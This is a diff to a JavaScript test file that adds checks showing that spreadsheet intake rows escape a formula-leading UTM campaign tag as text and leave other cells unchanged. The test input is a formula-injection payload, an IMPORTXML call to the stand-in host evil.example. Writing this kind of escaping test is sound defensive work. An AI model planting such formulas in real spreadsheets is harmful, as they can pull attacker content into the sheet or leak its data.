@@ -351,6 +351,20 @@ check(
   buildIntakeLeadSourceCells(INSTAGRAM).every((c) => typeof c === "string"),
   true
 );
+// The append is USER_ENTERED: a formula-leading tag is stored as text, and
+// the escape never reaches cells 1–22.
+const poisoned = buildIntakeRow(
+  { ...wizard, name: "Maya Chen", notes: "=1+1" },
+  TS,
+  HOUSEHOLD,
+  { ...INSTAGRAM, utm_campaign: "=IMPORTXML(\"https://evil.example\",\"//a\")" }
+);
+check("a formula-leading campaign tag is stored as text", poisoned[24], "'=IMPORTXML(\"https://evil.example\",\"//a\")");
+check(
+  "cells 1–22 are untouched by the lead-cell escape (notes col 10 is as it always was)",
+  poisoned.slice(0, 22),
+  buildIntakeRow({ ...wizard, name: "Maya Chen", notes: "=1+1" }, TS, HOUSEHOLD)
+);
 
 // Two players, one submission: the same lead block on each row.
 const sib1 = buildIntakeRow({ ...wizard, name: "Maya Chen" }, TS, HOUSEHOLD, INSTAGRAM);
